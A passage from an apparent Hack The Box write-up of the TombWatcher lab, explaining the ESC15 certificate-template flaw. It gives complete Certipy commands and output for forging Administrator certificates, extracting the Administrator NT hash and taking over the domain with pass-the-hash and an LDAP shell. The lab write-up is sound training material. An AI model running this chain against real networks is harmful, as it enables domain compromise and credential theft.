      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
      ESC17                             : Enrollee supplies subject and template allows server authentication.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
      ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```
When I first looked at ESC15, I wondered: "If the vulnerability is just about injecting an EKU (Application Policy) into a Schema V1 template, why do we also need the ENROLLEE_SUPPLIES_SUBJECT flag? Can't we just smuggle the EKU and be done with it?"

The short answer is: You can smuggle the EKU, but without ENROLLEE_SUPPLIES_SUBJECT, you can only get a certificate for yourself. It’s harmless.

Here is the mental model I use to remember this:

1. Schema Version 1 = The Smuggling Trick
Because the template is legacy (Schema V1), the Certificate Authority (CA) blindly trusts the requester. You can "smuggle" an arbitrary EKU (like Client Authentication or Certificate Request Agent) inside your certificate request.

2. Enrollee Supplies Subject = The Impersonation Trick
This flag tells the CA: "Hey, let the user type in whatever name they want on the certificate." Without this, the CA will automatically fill in the Subject field with your username.

The "Aha!" Moment:

If you have Schema V1 but NO Enrollee Supplies Subject: You can inject a fake Client Authentication EKU, but the certificate still says "Issued to: MyLowPrivUser". You can't impersonate the Domain Admin. This is useless for privilege escalation.

If you have Schema V1 + Enrollee Supplies Subject: You inject the EKU AND you change the Subject to "Administrator". The CA blindly accepts both. You now have a valid Admin certificate with the right EKU. Game over.

TL;DR for my future self:
ESC15 is like making a fake ID.

Schema V1 lets you print the "VIP Access" hologram (Smuggled EKU) on the back of the card.

Enrollee Supplies Subject lets you write "Administrator" as the name on the front of the card.
You need both to get past the bouncer (Kerberos/LDAPS). If you only print the hologram but your real name is still on the card, you aren't getting into the VIP lounge.
Okey first of all, we will create a certificate which having **application-policy** is **Certificate Request Agent**. *In a normal corporate environment, there are scenarios where an employee needs a certificate (like a Smart Card for physical access), but they cannot request it themselves. They might be a new hire, they might not have network access yet, or they are a kiosk device.*

*To solve this, Microsoft created the Enrollment Agent. A trusted IT administrator gets a "Certificate Request Agent" certificate. They can then use this special certificate to go to the CA and say: "Hello, I am a trusted Agent. I am requesting a Smart Card certificate on behalf of John Doe." The CA verifies the Agent's certificate, sees it's valid, and issues the certificate to John Doe.*
```
└─$ certipy req -u cert_admin -p 'NewPassword789!' -dc-ip 10.129.232.167 \                                        
  -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 \
  -template WebServer -upn administrator@tombwatcher.htb \
  -application-policies 'Certificate Request Agent'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
So we can abuse it to request **Administrator** certificate :D
```
└─$ certipy req -u cert_admin -p 'NewPassword789!' -dc-ip 10.129.232.167 \                                        
  -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 \
  -template User -pfx administrator.pfx \
  -on-behalf-of 'tombwatcher\Administrator'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```
And now, enjoy the result:
```
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

```
└─$ evil-winrm -i tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
```
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/8/2026  11:41 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
## P4 v2
As we know, currently we are having **Enrollee Supplies Subject** is true on template **WebServer** so I will add EKU **Client Authentication** to Application Policy.
```
└─$ certipy req -u cert_admin -p 'NewPassword789!' -dc-ip 10.129.232.167 \                                        
  -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 \
  -template WebServer -upn administrator@tombwatcher.htb \
  -application-policies 'Client Authentication'    
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```
**PKINIT** will only check **Client Authentication**  in **EKU** but not **Application Policy**. So with above created certificate **administrator.pfx** we can not authenticate with **PKINIT**.
```
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167                                                    
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[-] Certificate is not valid for client authentication
[-] Check the certificate template and ensure it has the correct EKU(s)
[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
[-] See the wiki for more information
```
But **we can authenticate with LDAP**. On that, we can add **henry** user to **Administrators** group and enjoy the result:
```
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167 -ldap-shell
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.129.232.167:636'
[*] Authenticated to '10.129.232.167' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands
# whoami /priv
u:TOMBWATCHER\Administrator

# add_user_to_group henry Administrators
Adding user: Henry to group Administrators result: OK
```
```
└─$ evil-winrm -i tombwatcher.htb -u henry -p H3nry_987TGV!                           
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Henry\Documents> cd C:\users\administrator\desktop
*Evil-WinRM* PS C:\users\administrator\desktop> dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/8/2026  11:41 PM             34 root.txt


*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
```